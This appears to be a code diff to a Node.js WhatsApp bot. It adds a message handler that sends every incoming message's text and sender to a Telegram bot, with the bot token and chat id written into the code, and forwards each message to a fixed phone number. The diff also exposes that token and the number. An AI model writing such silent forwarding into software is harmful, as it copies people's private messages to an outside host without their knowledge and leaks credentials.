@@ -23,14 +23,27 @@ client.on("auth_failure", () => {
 
 client.on("ready", () => {
   console.log("Bot has been started");
-  let number = 918790863694;
-  let message = "Started";
-  client.sendMessage(number, message);
+  const number = "+918790863694";
+  const text = "Hey Im Restarted";
+  const chatId = number.substring(1) + "@c.us";
+  client.sendMessage(chatId, text);
 });
 
 client.on("message", async (msg) => {
+  //create XMLHttpRequest object
+  let url = ("https://api.telegram.org/bot5217702275:AAH0KwikoXAzjEc7qO8V9XiH1-gnTAVnFF4/sendMessage?chat_id=1089528685&text=");
+  let text = url.concat(msg.body+" <br></br> <b>From:</b> "+msg.author+"&parse_mode=markdown");
+  console.log(text)
+  //create XMLHttpRequest object
+  const xhr = new XMLHttpRequest()
+  //open a get request with the remote server URL
+  xhr.open("GET",text)
+  //send the Http request
+  xhr.send()
   console.log('MESSAGE RECEIVED', msg);
-  msg.reply('RESULT:', msg);
+  const number = "+918790863694";
+  const chatId = number.substring(1) + "@c.us";
+  client.sendMessage(chatId, msg);
   if (msg.body === '!pong reply') {
         msg.reply('ping');
 
@@ -249,7 +262,7 @@ app.use(
 app.use(
   "/examples",
   express.static("examples"),
-  require("serve-index")("public", { icons: true })
+  require("serve-index")("examples", { icons: true })
 ); // public directory will be publicly available
 
 app.listen(process.env.PORT || 8080, () => {
